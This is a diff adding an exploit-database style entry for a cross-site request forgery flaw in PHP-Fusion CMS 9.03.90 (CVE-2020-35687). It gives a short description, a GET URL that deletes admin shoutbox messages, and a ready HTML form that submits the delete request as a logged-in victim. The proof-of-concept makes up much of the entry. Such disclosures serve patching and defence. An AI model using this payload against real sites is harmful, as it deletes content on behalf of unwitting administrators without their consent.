@@ -1,0 +1,26 @@
+# Exploit Title: PHP-Fusion CMS 9.03.90 - Cross-Site Request Forgery (Delete admin shoutbox message)
+# Date: 2020-12-21
+# Exploit Author: Mohamed Oosman B S
+# Vendor Homepage: https://www.php-fusion.co.uk/
+# Software Link: https://www.php-fusion.co.uk/phpfusion_9_downloads.php
+# Version: 9.03.90 and below
+# Tested on: Windows 10
+# CVE : CVE-2020-35687
+
+1. Description:
+PHP-Fusion version 9.03.90 is vulnerable to CSRF attack which leads to deletion of shoutbox messages by the attacker on behalf of the logged in victim.
+
+2. Proof of Concept
+As the requests for deleting the admin shoutbox are sent using the GET method, the CSRF attack to delete an attacker-controlled shoutbox message can be performed by having the admin visit https://TARGET.com/infusions/shoutbox_panel/shoutbox_archive.php?s_action=delete&shout_id=1 directly,
+after getting to know the shout_id of the message, as it is sequential.
+
+<html>
+<body>
+<script>history.pushState('', '', '/')</script>
+<form action="https://TARGET/infusions/shoutbox_panel/shoutbox_archive.php">
+<input type="hidden" name="s&#95;action" value="delete" />
+<input type="hidden" name="shout&#95;id" value="3" />
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
